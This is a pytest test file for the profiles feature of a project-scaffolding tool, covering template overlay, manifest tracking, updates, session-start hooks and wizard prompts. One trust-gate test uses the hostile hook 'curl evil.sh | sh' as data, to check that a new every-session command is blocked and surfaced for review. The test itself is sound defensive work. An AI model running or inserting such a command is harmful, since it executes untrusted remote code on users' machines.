"""Profiles (RFC 2026-06-23): resolve/validate a profile, overlay it on the default scaffold
(managed by default, seed when listed), record it in the manifest, and refresh its managed
files on update when the profile ships a new version."""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from agent_native_setup import cli, profiles, update, update_check
from agent_native_setup.config import WizardConfig
from agent_native_setup.manifest import MANIFEST_PATH
from agent_native_setup.scaffold import Scaffolder, render


class _Console:
    def __init__(self) -> None:
        self.text = ""

    def print(self, *args: object, **_kw: object) -> None:
        self.text += " ".join(str(a) for a in args) + "\n"


def _make_profile(
    root: Path,
    name: str,
    files: dict[str, str],
    *,
    version: str = "1.0.0",
    extends: str | None = "default",
    seed: tuple[str, ...] = (),
    onboarding: tuple[str, ...] = (),
    session_start: tuple[str, ...] = (),
    prompts: list[dict] | None = None,
    tags: tuple[str, ...] = (),
    by_path: bool = False,
) -> profiles.Profile:
    d = root / name
    (d / "templates").mkdir(parents=True, exist_ok=True)
    manifest: dict[str, object] = {
        "name": name,
        "version": version,
        "extends": extends,
        "description": "x",
    }
    if tags:
        manifest["tags"] = list(tags)
    if seed:
        manifest["seed"] = list(seed)
    if onboarding:
        manifest["onboarding"] = list(onboarding)
    if session_start:
        manifest["session_start"] = list(session_start)
    if prompts:
        manifest["prompts"] = prompts
    (d / "profile.json").write_text(json.dumps(manifest), encoding="utf-8")
    for rel, content in files.items():
        p = d / "templates" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    # by_path records a real path source, so `update` can re-resolve the profile.
    return profiles.load(d, source=str(d) if by_path else name)


def _bump_profile(
    pdir: Path,
    *,
    version: str,
    files: dict[str, str] | None = None,
    session_start: list[str] | None = None,
) -> None:
    """Mutate a profile dir in place to simulate the author shipping a new version."""
    data = json.loads((pdir / "profile.json").read_text(encoding="utf-8"))
    data["version"] = version
    if session_start is not None:
        data["session_start"] = session_start
    (pdir / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    for rel, content in (files or {}).items():
        p = pdir / "templates" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")


def _config(target: Path) -> WizardConfig:
    return WizardConfig(
        project_name="demo", output_dir=target, languages=["python"], init_git=False
    )


# --- resolve / load -------------------------------------------------------------------------


def test_resolve_default_is_none_and_missing_errors(tmp_path: Path) -> None:
    assert profiles.resolve("default") is None
    assert profiles.resolve("") is None
    with pytest.raises(profiles.ProfileError, match="not found"):
        profiles.resolve(str(tmp_path / "nope"))


def test_load_validates_name_version_and_extends(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "profile.json").write_text(json.dumps({"name": "x"}), encoding="utf-8")  # no version
    with pytest.raises(profiles.ProfileError, match="required"):
        profiles.load(bad)
    (bad / "profile.json").write_text(  # extends omitted → must be explicit
        json.dumps({"name": "x", "version": "1.0.0"}), encoding="utf-8"
    )
    with pytest.raises(profiles.ProfileError, match="extends"):
        profiles.load(bad)
    (bad / "profile.json").write_text(  # a bogus extends value
        json.dumps({"name": "x", "version": "1.0.0", "extends": "weird"}), encoding="utf-8"
    )
    with pytest.raises(profiles.ProfileError, match="extends"):
        profiles.load(bad)
    # "default" and explicit null are both valid.
    for value in ("default", None):
        (bad / "profile.json").write_text(
            json.dumps({"name": "x", "version": "1.0.0", "extends": value}), encoding="utf-8"
        )
        assert profiles.load(bad).standalone is (value is None)


def test_resolve_from_user_dir_by_name(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(profiles, "USER_PROFILE_DIR", tmp_path / "profiles")
    _make_profile(tmp_path / "profiles", "team", {"docs/x.md": "hi\n"})
    resolved = profiles.resolve("team")
    assert resolved is not None and resolved.name == "team" and resolved.source == "team"


# --- overlay / apply ------------------------------------------------------------------------


def test_apply_overrides_a_base_managed_file(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    sc = Scaffolder(target)
    cli.build(config, sc)  # default scaffold — INSTRUCTION.md is managed

    prof = _make_profile(tmp_path, "team", {"INSTRUCTION.md": "# Team method\n"})
    profiles.apply(prof, config, sc, {})

    assert (target / "INSTRUCTION.md").read_text(encoding="utf-8") == "# Team method\n"  # wins
    assert "INSTRUCTION.md" not in sc.seed  # managed by default → refreshed from the profile


def test_apply_marks_managed_and_seed_files(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    sc = Scaffolder(target)
    cli.build(config, sc)

    prof = _make_profile(
        tmp_path, "team", {"managed.md": "m\n", "once.md": "o\n"}, seed=("once.md",)
    )
    profiles.apply(prof, config, sc, {})

    assert "managed.md" in sc.recorded and "managed.md" not in sc.seed  # refreshed on update
    assert "once.md" in sc.seed  # listed in `seed` → write-once


def test_apply_renders_j2_and_ships_other_files_verbatim(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    sc = Scaffolder(target)
    cli.build(config, sc)

    prof = _make_profile(
        tmp_path,
        "team",
        {
            "docs/team.md.j2": "project={{ project_name }}\n",  # rendered, .j2 stripped
            ".github/workflows/team.yml": "run: ${{ secrets.TOKEN }}\n",  # must stay verbatim
        },
    )
    profiles.apply(prof, config, sc, {})

    assert (target / "docs/team.md").read_text(encoding="utf-8") == "project=demo\n"
    assert not (target / "docs/team.md.j2").exists()  # the .j2 suffix is stripped
    # A literal ${{ ... }} survives because non-.j2 files are not run through Jinja.
    assert (target / ".github/workflows/team.yml").read_text(encoding="utf-8") == (
        "run: ${{ secrets.TOKEN }}\n"
    )


def test_overlay_leaves_a_preexisting_user_file_alone(tmp_path: Path) -> None:
    # A file that pre-existed the scaffold is the user's — overlay must not clobber it (no force).
    target = tmp_path / "proj"
    target.mkdir()
    (target / "keep.md").write_text("user content\n", encoding="utf-8")
    sc = Scaffolder(target)
    sc.overlay("keep.md", "profile content\n")
    assert (target / "keep.md").read_text(encoding="utf-8") == "user content\n"
    assert "keep.md" in sc.skipped and "keep.md" not in sc.seed
    # With --force, the profile overlay wins and is recorded as seed.
    forced = Scaffolder(target, force=True)
    forced.overlay("keep.md", "profile content\n")
    assert (target / "keep.md").read_text(encoding="utf-8") == "profile content\n"
    assert "keep.md" in forced.seed


# --- integration: build + manifest + update -------------------------------------------------


def test_build_with_profile_records_the_block_and_owned_files(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    prof = _make_profile(tmp_path, "team", {".claude/agents/team.md": "# team\n"})
    cli.build(config, Scaffolder(target), prof)

    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    block = m["profile"]
    keys = ("name", "version", "extends", "source", "safety")
    assert {k: block[k] for k in keys} == prof.manifest_block()
    assert block["safety"] == "safe"  # only a .md agent, no hooks → derived safe
    assert block["files"] == [".claude/agents/team.md"]  # exactly what the profile owns
    assert ".claude/agents/team.md" in m["files"]
    assert ".claude/agents/team.md" not in m["seed"]  # managed by default (refreshed on update)
    assert (target / ".claude/agents/team.md").read_text(encoding="utf-8") == "# team\n"


def _git(target: Path, *args: str) -> None:
    subprocess.run(
        [
            "git",
            "-C",
            str(target),
            "-c",
            "user.email=t@e",
            "-c",
            "user.name=t",
            "-c",
            "commit.gpgsign=false",
            *args,
        ],
        check=True,
        capture_output=True,
    )


def _commit(target: Path) -> None:
    _git(target, "init", "-q")
    _git(target, "add", "-A")
    _git(target, "commit", "-q", "-m", "baseline", "--no-verify")


def test_update_preserves_the_profile_block_and_files(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    prof = _make_profile(tmp_path, "team", {".claude/agents/team.md": "# team\n"}, by_path=True)
    cli.build(config, Scaffolder(target), prof)
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0

    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["name"] == "team"  # block survives the update
    assert (
        ".claude/agents/team.md" in m["profile"]["files"] and ".claude/agents/team.md" in m["files"]
    )
    assert (target / ".claude/agents/team.md").read_text(
        encoding="utf-8"
    ) == "# team\n"  # untouched


def test_update_keeps_a_profile_override_of_a_base_managed_file(tmp_path: Path) -> None:
    # A profile that overrides a base *managed* file (INSTRUCTION.md) must keep its content on
    # update — the base must NOT refresh back over it (the profile re-applies and wins).
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    prof = _make_profile(tmp_path, "team", {"INSTRUCTION.md": "# Team method\n"}, by_path=True)
    cli.build(config, Scaffolder(target), prof)
    assert (target / "INSTRUCTION.md").read_text(encoding="utf-8") == "# Team method\n"
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "INSTRUCTION.md").read_text(encoding="utf-8") == "# Team method\n"  # kept
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "INSTRUCTION.md" in m["profile"]["files"] and "INSTRUCTION.md" not in m["seed"]


def test_update_does_not_accumulate_stale_default_seed_for_a_profiled_project(
    tmp_path: Path,
) -> None:
    # Regression: the overlay restore must touch ONLY profile-owned files, not the whole seed
    # set — else a renamed default seed file (the date-stamped bootstrap RFC) is wrongly carried
    # into the manifest on a cross-date update, accruing a stale entry every time.
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(tmp_path, "team", {"x.md": "x\n"}, by_path=True)
    cli.build(_config(target), Scaffolder(target), prof)
    # Simulate an earlier scaffold: re-date the bootstrap RFC on disk + in the manifest.
    rfc_dir = target / "docs/rfc/active"
    [boot] = list(rfc_dir.glob("*-adopt-agent-native-setup.md"))
    new_rel, old_rel = f"docs/rfc/active/{boot.name}", "docs/rfc/active/2026-01-01-adopt.md"
    (target / old_rel).write_text(boot.read_text(encoding="utf-8"), encoding="utf-8")
    boot.unlink()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["files"][old_rel] = m["files"].pop(new_rel)
    m["seed"] = [old_rel if s == new_rel else s for s in m["seed"]]
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0
    nm = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    adopts = [f for f in nm["files"] if f.endswith("-adopt.md") or "adopt-agent-native" in f]
    assert len(adopts) == 1  # exactly one bootstrap RFC tracked — no stale carry-forward
    assert "x.md" in nm["files"]  # the profile overlay IS still preserved (managed)


# --- Phase 2: the profile-update path -------------------------------------------------------


def test_update_refreshes_a_managed_profile_file_on_a_compatible_bump(tmp_path: Path) -> None:
    # The headline: ship a new (compatible) profile version, and `update` pulls the new file.
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"docs/house.md": "v2\n"})  # same 0.1 series
    assert update.run(target, dry_run=False, console=_Console()) == 0

    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v2\n"  # refreshed
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["version"] == "0.1.1"  # new version recorded


def test_update_refreshes_a_profile_override_of_a_base_seed_file(tmp_path: Path) -> None:
    # Regression: a profile can *manage* a file the base ships as seed (e.g. README.md). The
    # managed overlay must clear the base's seed mark, or a new profile version never refreshes.
    prof = _make_profile(
        tmp_path, "team", {"README.md": "team v1\n"}, version="0.1.0", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "README.md" not in m["seed"]  # the managed overlay overrode the base seed mark
    assert "README.md" in m["profile"]["files"]
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"README.md": "team v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "README.md").read_text(
        encoding="utf-8"
    ) == "team v2\n"  # refreshed, not frozen


def test_update_reports_an_edited_profile_file_as_a_conflict(tmp_path: Path) -> None:
    # A profile file the user edited is never clobbered — it's surfaced as a conflict instead.
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    (target / "docs/house.md").write_text("my own edit\n", encoding="utf-8")
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"docs/house.md": "v2\n"})
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "my own edit\n"  # kept
    assert "docs/house.md" in console.text  # surfaced for the user to reconcile


def test_update_does_not_refresh_a_seed_profile_file(tmp_path: Path) -> None:
    # A file listed in the profile's `seed` is write-once — a new version does NOT touch it.
    prof = _make_profile(
        tmp_path,
        "team",
        {"starter.md": "v1\n"},
        version="0.1.0",
        seed=("starter.md",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"starter.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "starter.md").read_text(encoding="utf-8") == "v1\n"  # frozen, not refreshed


def test_a_breaking_profile_bump_gates_then_proceeds_with_yes(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="2.0.0", files={"docs/house.md": "v2\n"})  # breaking (major)
    console = _Console()
    assert update.run(target, dry_run=False, console=console, assume_yes=False) == 2  # refused
    assert "needs confirmation" in console.text and "profile team 1.0.0 → 2.0.0" in console.text
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v1\n"  # nothing changed

    assert update.run(target, dry_run=False, console=_Console(), assume_yes=True) == 0  # confirmed
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v2\n"


def test_update_degrades_when_the_profile_cannot_be_re_resolved(tmp_path: Path) -> None:
    # If the profile source is gone at update time, the base still updates and the profile's
    # files are kept frozen, with a warning — not a crash, not a silent drop.
    prof = _make_profile(tmp_path, "team", {"docs/house.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # the profile directory no longer exists
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text  # warned
    assert (target / "docs/house.md").read_text(encoding="utf-8") == "v1\n"  # kept frozen
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["name"] == "team"  # provenance preserved


# --- Phase 3: profile-contributed startup (onboarding + SessionStart hooks) -----------------


def _session_hooks(target: Path) -> list[str]:
    s = json.loads((target / ".claude/settings.json").read_text(encoding="utf-8"))
    return [h["command"] for h in s["hooks"]["SessionStart"][0]["hooks"]]


def test_load_validates_session_start_is_a_string_list(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "profile.json").write_text(
        json.dumps(
            {"name": "x", "version": "1.0.0", "extends": "default", "session_start": "echo"}
        ),
        encoding="utf-8",
    )
    with pytest.raises(profiles.ProfileError, match="session_start"):
        profiles.load(bad)


def test_profile_onboarding_steps_fold_into_onboarding_md(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, onboarding=("Run `task team-setup`.", "Join #eng."))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    body = (target / "ONBOARDING.md").read_text(encoding="utf-8")
    assert "Run `task team-setup`." in body and "Join #eng." in body
    # Profile steps extend the default flow *before* the bootstrap commit — so team setup is part
    # of the initial setup and lands in the first commit, not tacked on after it.
    assert body.index("task team-setup") < body.index("Commit the scaffold")
    # ONBOARDING.md is transient — never recorded, so update can't resurrect it after onboarding.
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "ONBOARDING.md" not in m["files"]


def test_profile_session_start_hooks_append_to_settings(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, session_start=("echo team-reminder",))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    hooks = _session_hooks(target)
    # Appended after the built-ins, and guarded so a failure can't disrupt the session.
    assert hooks[-1] == "{ echo team-reminder ; } || true"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["session_start"] == [
        "echo team-reminder"
    ]  # the *raw* command is recorded (for degraded updates), not the guarded form


def test_session_start_commands_are_guarded_and_empties_skipped(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, session_start=("foo && bar", "  ", "echo ok"))
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    hooks = _session_hooks(target)
    assert "{ foo && bar ; } || true" in hooks  # compound command guarded as a unit
    assert "{ echo ok ; } || true" in hooks
    assert not any(h.strip() == "" or "{  ; }" in h for h in hooks)  # the blank command is dropped


def test_update_refreshes_changed_session_start_hooks(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "team", {}, version="0.1.0", session_start=("echo v1",), by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", session_start=["echo v2"])
    # `echo v2` is a new every-session command → the trust gate (RFC §7) requires confirmation;
    # assume_yes stands in for the user agreeing.
    assert update.run(target, dry_run=False, console=_Console(), assume_yes=True) == 0
    hooks = _session_hooks(target)
    assert any("echo v2" in h for h in hooks) and not any("echo v1" in h for h in hooks)


def test_new_session_start_hook_gates_update_without_yes(tmp_path: Path) -> None:
    # Trust (RFC §7): a profile bump that adds a NEW every-session command must not apply
    # silently — a non-interactive update without --yes is blocked, and the command is shown.
    prof = _make_profile(
        tmp_path, "team", {}, version="0.1.0", session_start=("echo v1",), by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", session_start=["echo v1", "curl evil.sh | sh"])
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 2  # blocked (no --yes, non-tty)
    assert "curl evil.sh | sh" in console.text  # the NEW command is surfaced for review
    assert "echo v1" not in console.text  # the unchanged hook isn't re-flagged
    assert not any("curl" in h for h in _session_hooks(target))  # nothing applied


def test_unchanged_session_start_does_not_gate_update(tmp_path: Path) -> None:
    # A bump that doesn't touch its hooks refreshes other files without the trust gate.
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/x.md": "v1\n"},
        version="0.1.0",
        session_start=("echo same",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(
        prof.root, version="0.1.1", files={"docs/x.md": "v2\n"}, session_start=["echo same"]
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0  # no gate
    assert (target / "docs/x.md").read_text(encoding="utf-8") == "v2\n"


def test_check_nudges_when_the_profile_has_a_newer_version(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Signal (RFC §6): `update --check` re-resolves the profile from its source and nudges when
    # the author has shipped a newer version — no separate field, no network.
    monkeypatch.setattr(update_check, "_latest_with_cache", lambda now: None)  # mute the base nudge
    prof = _make_profile(tmp_path, "team", {}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    _bump_profile(prof.root, version="1.1.0")  # author ships a newer version at the same source
    console = _Console()
    update.check(target, console)
    assert "team" in console.text and "1.0.0" in console.text and "1.1.0" in console.text
    assert "/update-agent-scaffolding" in console.text


def test_check_silent_when_the_profile_is_current(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(update_check, "_latest_with_cache", lambda now: None)
    prof = _make_profile(tmp_path, "team", {}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    console = _Console()
    update.check(target, console)
    assert console.text == ""  # nothing newer → no nudge


def test_check_is_silent_when_the_profile_source_is_gone(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # check() runs from a SessionStart hook — re-resolving a deleted profile source must never
    # raise. The nudge just stays quiet.
    monkeypatch.setattr(update_check, "_latest_with_cache", lambda now: None)
    prof = _make_profile(tmp_path, "team", {}, version="1.0.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    shutil.rmtree(prof.root)  # source gone between scaffold and check
    console = _Console()
    assert update.check(target, console) == 0
    assert console.text == ""


def test_standalone_session_start_refreshes_on_update(tmp_path: Path) -> None:
    # A standalone profile's minimal settings.json is managed — an unchanged hook refreshes on a
    # bump (and isn't orphaned), with no trust gate since the command didn't change.
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "v1\n"},
        version="0.1.0",
        extends=None,
        session_start=("echo v1",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(
        prof.root, version="0.1.1", files={"AGENTS.md": "v2\n"}, session_start=["echo v1"]
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0  # no gate
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v2\n"
    assert (target / ".claude/settings.json").exists()  # managed, not orphaned
    assert any("echo v1" in h for h in _session_hooks(target))


def test_session_start_without_claude_warns_instead_of_silently_dropping(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # SessionStart hooks need Claude's .claude/ config; targeting only cursor means there's
    # nowhere to put them — so warn rather than record hooks that never run.
    prof = _make_profile(tmp_path, "team", {}, session_start=("echo x",), by_path=True)
    target = tmp_path / "proj"
    rc = cli.main(
        [
            "demo",
            "-o",
            str(target),
            "-y",
            "--no-git",
            "--tools",
            "cursor",
            "--profile",
            str(prof.root),
        ]
    )
    assert rc == 0
    assert "session_start hooks" in capsys.readouterr().out  # warned
    assert not (target / ".claude/settings.json").exists()  # no Claude settings to hold them


def test_degraded_update_keeps_session_start_hooks(tmp_path: Path) -> None:
    # If the profile is gone at update time, its recorded hooks must survive — the base must not
    # regenerate settings.json *without* them.
    prof = _make_profile(
        tmp_path, "team", {}, version="0.1.0", session_start=("echo keepme",), by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # profile source gone
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text
    assert any("echo keepme" in h for h in _session_hooks(target))  # NOT stripped by the base


# --- Phase 4: prompts (a declarative wizard) ------------------------------------------------


def _load_prompts(tmp_path: Path, prompts: list[dict]) -> profiles.Profile:
    d = tmp_path / "p"
    d.mkdir(exist_ok=True)
    (d / "profile.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "extends": "default", "prompts": prompts}),
        encoding="utf-8",
    )
    return profiles.load(d)


def test_load_validates_prompts(tmp_path: Path) -> None:
    with pytest.raises(profiles.ProfileError, match="identifier"):
        _load_prompts(tmp_path, [{"name": "bad-name", "type": "text", "message": "m"}])
    with pytest.raises(profiles.ProfileError, match="type"):
        _load_prompts(tmp_path, [{"name": "x", "type": "nope", "message": "m"}])
    with pytest.raises(profiles.ProfileError, match="choices"):
        _load_prompts(tmp_path, [{"name": "x", "type": "select", "message": "m"}])
    with pytest.raises(profiles.ProfileError, match="duplicate"):
        _load_prompts(
            tmp_path,
            [
                {"name": "x", "type": "text", "message": "m"},
                {"name": "x", "type": "text", "message": "m"},
            ],
        )
    with pytest.raises(profiles.ProfileError, match="default"):  # select default in choices
        _load_prompts(
            tmp_path,
            [{"name": "x", "type": "select", "message": "m", "choices": ["a"], "default": "z"}],
        )
    with pytest.raises(profiles.ProfileError, match="default"):  # confirm default must be bool
        _load_prompts(
            tmp_path, [{"name": "x", "type": "confirm", "message": "m", "default": "yes"}]
        )
    with pytest.raises(profiles.ProfileError, match="default"):  # text default must be str
        _load_prompts(tmp_path, [{"name": "x", "type": "text", "message": "m", "default": 5}])
    with pytest.raises(profiles.ProfileError, match="default"):  # checkbox default within choices
        _load_prompts(
            tmp_path,
            [{"name": "x", "type": "checkbox", "message": "m", "choices": ["a"], "default": ["z"]}],
        )


def _fake_questionary(monkeypatch: pytest.MonkeyPatch, returns: dict[str, object]) -> list[str]:
    """Stub questionary so `gather_answers` runs headless; returns the list of asked messages."""
    import questionary

    asked: list[str] = []

    class _Ans:
        def __init__(self, value: object) -> None:
            self._value = value

        def unsafe_ask(self) -> object:
            return self._value

    def widget(kind: str):
        def make(message: str, **_kw: object) -> _Ans:
            asked.append(message)
            return _Ans(returns[kind])

        return make

    for kind in ("text", "confirm", "select", "checkbox"):
        monkeypatch.setattr(questionary, kind, widget(kind))
    return asked


_DB_PROMPTS = [
    {"name": "use_db", "type": "confirm", "message": "DB?"},
    {
        "name": "engine",
        "type": "text",
        "message": "Engine?",
        "when": "answers.use_db",
        "default": "sqlite",
    },
]


def test_when_false_skips_the_prompt_and_uses_its_default(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": False, "text": "postgres"})
    prof = _make_profile(tmp_path, "team", {}, prompts=_DB_PROMPTS)
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {"use_db": False, "engine": "sqlite"}  # engine skipped → its default
    assert "Engine?" not in asked  # never asked


def test_when_true_asks_the_dependent_prompt(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": True, "text": "postgres"})
    prof = _make_profile(tmp_path, "team", {}, prompts=_DB_PROMPTS)
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {"use_db": True, "engine": "postgres"}  # asked
    assert "Engine?" in asked


# --- --answer overrides (headless answers) ----------------------------------------------------


_TYPED_PROMPTS = [
    {"name": "svc", "type": "text", "message": "Service?"},
    {"name": "db", "type": "confirm", "message": "DB?", "default": True},
    {"name": "tier", "type": "select", "message": "Tier?", "choices": ["basic", "premium"]},
    {"name": "extras", "type": "checkbox", "message": "Extras?", "choices": ["a", "b", "c"]},
]


def test_parse_answer_overrides_coerces_each_type(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    got = profiles.parse_answer_overrides(["svc=api", "db=no", "tier=premium", "extras=a,c"], prof)
    assert got == {"svc": "api", "db": False, "tier": "premium", "extras": ["a", "c"]}
    assert profiles.parse_answer_overrides(["extras="], prof) == {"extras": []}
    # a text value may contain '=' — only the first splits
    assert profiles.parse_answer_overrides(["svc=a=b"], prof) == {"svc": "a=b"}


@pytest.mark.parametrize(
    ("pair", "match"),
    [
        ("svc", "not NAME=VALUE"),
        ("nope=1", "no prompt named 'nope'"),
        ("db=maybe", "not a boolean"),
        ("tier=gold", "not a choice"),
        ("extras=a,z", "not in choices"),
    ],
)
def test_parse_answer_overrides_rejects_bad_input(tmp_path: Path, pair: str, match: str) -> None:
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    with pytest.raises(profiles.ProfileError, match=match):
        profiles.parse_answer_overrides([pair], prof)


def test_duplicate_answer_for_the_same_prompt_is_rejected(tmp_path: Path) -> None:
    # last-wins would silently mask a pipeline copy-paste mistake — refuse instead
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    with pytest.raises(profiles.ProfileError, match="more than once"):
        profiles.parse_answer_overrides(["svc=a", "svc=b"], prof)


def test_overridden_prompt_is_never_asked_and_feeds_when(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": False, "text": "postgres"})
    prof = _make_profile(tmp_path, "team", {}, prompts=_DB_PROMPTS)
    answers = profiles.gather_answers(
        prof, _config(tmp_path / "x"), interactive=True, overrides={"use_db": True}
    )
    # use_db came from --answer (not the stubbed False), and its value made `when` ask engine.
    assert answers == {"use_db": True, "engine": "postgres"}
    assert asked == ["Engine?"]


def test_overrides_merge_over_defaults_non_interactively(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    answers = profiles.gather_answers(
        prof, _config(tmp_path / "x"), interactive=False, overrides={"tier": "premium"}
    )
    assert answers == {"svc": "", "db": True, "tier": "premium", "extras": []}


def test_answer_flag_end_to_end(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/tier.md.j2": "tier: {{ answers.tier }}"},
        prompts=[
            {
                "name": "tier",
                "type": "select",
                "message": "Tier?",
                "choices": ["basic", "premium"],
                "default": "basic",
            }
        ],
    )
    target = tmp_path / "proj"
    args = ["demo", "-o", str(target), "-y", "--no-git", "--profile", str(prof.root)]
    rc = cli.main([*args, "--answer", "tier=premium"])
    assert rc == 0
    assert (target / "docs" / "tier.md").read_text(encoding="utf-8") == "tier: premium"
    # the override is recorded in the manifest, so update replays it
    manifest = json.loads((target / ".agent-native-setup.json").read_text(encoding="utf-8"))
    assert manifest["profile"]["answers"] == {"tier": "premium"}


